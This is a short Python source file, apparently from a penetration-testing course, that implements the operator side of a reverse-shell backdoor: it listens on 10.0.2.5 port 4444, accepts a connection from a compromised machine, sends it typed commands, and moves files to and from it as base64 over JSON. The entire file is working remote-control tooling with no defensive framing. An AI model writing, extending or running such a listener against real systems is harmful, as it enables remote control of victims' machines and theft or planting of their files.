import json
import socket, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                            1)  # modifying sockets for reusing sockets, 1 to enable
        # these options
        listener.bind((ip, port))
        listener.listen(0)  # backlog in the method, 0 backlogs
        print("[+] Waiting for incoming connections")
        self.connection, self.address = listener.accept()
        print("[+] Got a connection from " + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)  # python 2
        # self.connection.send(json_data.encode())  # python 3

    def reliable_recv(self):
        json_data = ""  # python 2
        # json_data = b""  # python 3
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")  #python 2
            # command = input(">> ")  # python 3
            command = command.split(" ")  # split into list
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            print(result)


myListener = Listener("10.0.2.5", 4444)
myListener.run()
